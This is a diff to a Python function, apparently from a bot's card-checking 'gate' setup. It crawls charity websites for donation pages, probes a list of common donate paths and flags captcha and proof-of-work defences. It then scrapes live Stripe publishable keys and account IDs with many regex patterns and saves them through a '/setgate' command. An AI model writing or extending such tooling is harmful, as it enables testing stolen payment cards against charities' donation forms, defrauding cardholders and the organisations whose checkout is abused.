+        if final_url and str(final_url) != full_url:
+            new_parsed = urlparse(str(final_url))
+            if new_parsed.netloc != parsed.netloc:
+                site_url = f"{new_parsed.scheme}://{new_parsed.netloc}"
+                new_settings["site_url"] = site_url
+                results["site_url"] = site_url
+                results["auto_detected"].append(f"Redirected to: {site_url}")
+            redir_path = new_parsed.path
+            if redir_path and redir_path != "/":
+                donate_path = redir_path
+                if new_parsed.query:
+                    donate_path = f"{redir_path}?{new_parsed.query}"
+                elif not donate_path.endswith("/") and "." not in donate_path.split("/")[-1]:
+                    donate_path += "/"
+                results["donate_path"] = donate_path
+
+        if r.status_code == 200 and ('donate' in page_html.lower() or 'stripe' in page_html.lower()
+                                     or 'payment' in page_html.lower() or 'give' in page_html.lower()):
+            r2 = r
+        else:
+            donate_url = f"{site_url}{donate_path}"
+            try:
+                r2 = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
+                if r2.status_code == 404:
+                    common_paths = [
+                        "/donate/", "/donations/", "/give/", "/support/",
+                        "/contribute/", "/donation/", "/donate-online/",
+                        "/make-a-donation/", "/donate-now/", "/support-us/",
+                        "/ways-to-give/", "/get-involved/donate/",
+                        "/how-to-donate/", "/make-donation/", "/giving/",
+                        "/support-us/donate/", "/help/donate/",
+                    ]
+                    found = False
+                    for path in common_paths:
+                        if path == donate_path:
+                            continue
+                        try:
+                            test_r = s.get(f"{site_url}{path}", verify=False, timeout=10,
+                                           allow_redirects=True)
+                            if test_r.status_code == 200:
+                                tl = test_r.text.lower()
+                                if any(kw in tl for kw in ['charitable', 'donation', 'stripe',
+                                                           'donate', 'give', 'payment']):
+                                    donate_path = path
+                                    results["donate_path"] = path
+                                    results["auto_detected"].append(f"Donate path: {path} (auto-found)")
+                                    r2 = test_r
+                                    found = True
+                                    break
+                        except Exception:
+                            continue
+                    if not found:
+                        results["errors"].append(f"Donate page not found at {donate_path}")
+                        return results
+                elif r2.status_code != 200:
+                    results["errors"].append(f"Donate page HTTP {r2.status_code}")
                     return results
-            elif r2.status_code != 200:
-                results["errors"].append(f"Donate page HTTP {r2.status_code}")
+                else:
+                    results["auto_detected"].append(f"Donate path: {donate_path}")
+            except Exception as e:
+                results["errors"].append(f"Cannot reach donate page: {str(e)[:60]}")
                 return results
-            else:
-                results["auto_detected"].append(f"Donate path: {donate_path}")
-        except Exception as e:
-            results["errors"].append(f"Cannot reach donate page: {str(e)[:60]}")
-            return results
+
+            page_html = r2.text
 
         new_settings["donate_path"] = donate_path
-
-        page_html = r2.text
 
         if 'pow_nonce' in page_html or 'Verifying' in page_html or 'not a bot' in page_html:
             results["pow_required"] = True
@@ -1386,25 +1962,87 @@ def setup_gate_from_url(full_url):
             else:
                 results["errors"].append("PoW challenge failed")
 
+        html_lower = page_html.lower()
+        if 'g-recaptcha' in html_lower or 'h-captcha' in html_lower or 'turnstile' in html_lower:
+            results["captcha_detected"] = True
+            captcha_type = "reCAPTCHA" if 'g-recaptcha' in html_lower else ("hCaptcha" if 'h-captcha' in html_lower else "Turnstile")
+            results["auto_detected"].append(f"Captcha: {captcha_type} detected")
+
         soup = BeautifulSoup(page_html, 'html.parser')
 
-        nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
-        form_id_el = soup.find('input', {'name': 'charitable_form_id'})
+        form_type, form_desc = _detect_form_type(page_html, soup)
+        if form_type:
+            results["form_found"] = True
+            results["form_type"] = form_type
+            results["auto_detected"].append(f"Form: {form_desc}")
+        else:
+            results["errors"].append("No donation form detected")
+
         campaign_el = soup.find('input', {'name': 'campaign_id'})
 
-        if nonce_el and form_id_el:
-            results["form_found"] = True
-            results["auto_detected"].append("Charitable form: detected")
-        else:
-            nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
-            form_match = re.search(r'charitable_form_id["\s]+value=["\']([^"\']+)', page_html)
-            if nonce_match and form_match:
-                results["form_found"] = True
-                results["auto_detected"].append("Charitable form: detected (regex)")
-            else:
-                results["errors"].append("Charitable donation form not found")
-
         pk = _extract_stripe_key(page_html)
+
+        if not pk:
+            pk_patterns_extended = [
+                r'"publishable_key"\s*:\s*"(pk_live_[^"]+)"',
+                r'"stripePublishableKey"\s*:\s*"(pk_live_[^"]+)"',
+                r'"STRIPE_PUBLIC_KEY"\s*:\s*"(pk_live_[^"]+)"',
+                r'data-key="(pk_live_[^"]+)"',
+                r"stripe_key\s*[=:]\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+                r"NEXT_PUBLIC_STRIPE[^=]*=\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+                r'"stripe_pk"\s*:\s*"(pk_live_[^"]+)"',
+                r'"gatewayKey"\s*:\s*"(pk_live_[^"]+)"',
+                r'"publicKey"\s*:\s*"(pk_live_[^"]+)"',
+                r'"apiKey"\s*:\s*"(pk_live_[^"]+)"',
+                r'data-stripe-key="(pk_live_[^"]+)"',
+                r'data-api-key="(pk_live_[^"]+)"',
+                r'content="(pk_live_[^"]+)"',
+                r"window\.__STRIPE_KEY__\s*=\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+                r"GATSBY_STRIPE[^=]*=\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+                r"REACT_APP_STRIPE[^=]*=\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+                r"VUE_APP_STRIPE[^=]*=\s*['\"]?(pk_live_[A-Za-z0-9_]+)",
+            ]
+            for pat in pk_patterns_extended:
+                m = re.search(pat, page_html)
+                if m:
+                    pk = m.group(1)
+                    results["auto_detected"].append(f"Key via extended pattern")
+                    break
+
+        if not pk:
+            data_attrs = soup.find_all(attrs={"data-key": True})
+            for el in data_attrs:
+                val = el.get("data-key", "")
+                if val.startswith("pk_live_"):
+                    pk = val
+                    results["auto_detected"].append("Key from data-key attribute")
+                    break
+            if not pk:
+                data_attrs = soup.find_all(attrs={"data-stripe-publishable-key": True})
+                for el in data_attrs:
+                    val = el.get("data-stripe-publishable-key", "")
+                    if val.startswith("pk_live_"):
+                        pk = val
+                        results["auto_detected"].append("Key from data-stripe-publishable-key")
+                        break
+
+        if not pk:
+            script_tags = soup.find_all('script', src=True)
+            for script in script_tags[:10]:
+                src = script.get('src', '')
+                if 'stripe' in src.lower() or 'donate' in src.lower() or 'payment' in src.lower():
+                    try:
+                        js_url = src if src.startswith('http') else f"{site_url}{src}"
+                        js_r = s.get(js_url, verify=False, timeout=10)
+                        if js_r.status_code == 200:
+                            js_pk = _extract_stripe_key(js_r.text)
+                            if js_pk:
+                                pk = js_pk
+                                results["auto_detected"].append(f"Key found in: {src[:40]}")
+                                break
+                    except Exception:
+                        continue
+
         if pk:
             new_settings["pub_key"] = pk
             results["stripe_key"] = pk[:25] + "..."
@@ -1413,25 +2051,52 @@ def setup_gate_from_url(full_url):
             results["errors"].append("No Stripe key found - set manually via /setgate key [key]")
 
         if campaign_el:
-            cid = campaign_el.get('value', '')
-            if cid:
-                new_settings["campaign_id"] = cid
-                results["campaign_id"] = cid
-                results["auto_detected"].append(f"Campaign ID: {cid}")
+            cid_val = campaign_el.get('value', '')
+            if cid_val:
+                new_settings["campaign_id"] = cid_val
+                results["campaign_id"] = cid_val
+                results["auto_detected"].append(f"Campaign ID: {cid_val}")
 
-        acct_match = re.search(r'"stripeAccountId":"(acct_[^"]+)"', page_html) or \
-                     re.search(r'"accountId":"(acct_[^"]+)"', page_html) or \
-                     re.search(r'"stripe_account":"(acct_[^"]+)"', page_html)
-        if acct_match:
-            acct_id = acct_match.group(1)
-            new_settings["stripe_account"] = acct_id
-            results["stripe_account"] = acct_id
-            results["auto_detected"].append(f"Stripe account: {acct_id}")
+        acct_patterns = [
+            r'"stripeAccountId"\s*:\s*"(acct_[^"]+)"',
+            r'"accountId"\s*:\s*"(acct_[^"]+)"',
+            r'"stripe_account"\s*:\s*"(acct_[^"]+)"',
+            r'"stripeConnectAccountId"\s*:\s*"(acct_[^"]+)"',
+            r"acct_[A-Za-z0-9]{10,}",
+        ]
+        for pat in acct_patterns[:-1]:
+            acct_match = re.search(pat, page_html)
+            if acct_match:
+                acct_id = acct_match.group(1)
+                new_settings["stripe_account"] = acct_id
+                results["stripe_account"] = acct_id
+                results["auto_detected"].append(f"Stripe account: {acct_id}")
+                break
+        else:
+            raw_acct = re.search(acct_patterns[-1], page_html)
+            if raw_acct:
+                acct_id = raw_acct.group(0)
+                new_settings["stripe_account"] = acct_id
+                results["stripe_account"] = acct_id
+                results["auto_detected"].append(f"Stripe account: {acct_id}")
 
-        if results["form_found"] and pk:
+        has_stripe = pk is not None
+        has_form = results["form_found"]
+
+        if has_stripe and has_form:
             results["success"] = True
             for k, v in new_settings.items():
                 _set_gs("stripe", k, v)
+        elif has_stripe and not has_form:
+            results["success"] = True
+            results["auto_detected"].append("No form but Stripe key found — gate usable")
+            for k, v in new_settings.items():
+                _set_gs("stripe", k, v)
+        elif has_form and not has_stripe:
+            results["errors"].append("Form found but no Stripe key — set key manually")
+            for k, v in new_settings.items():
+                if v:
+                    _set_gs("stripe", k, v)
         else:
             results["errors"].append("Setup incomplete - previous gate settings preserved")
 
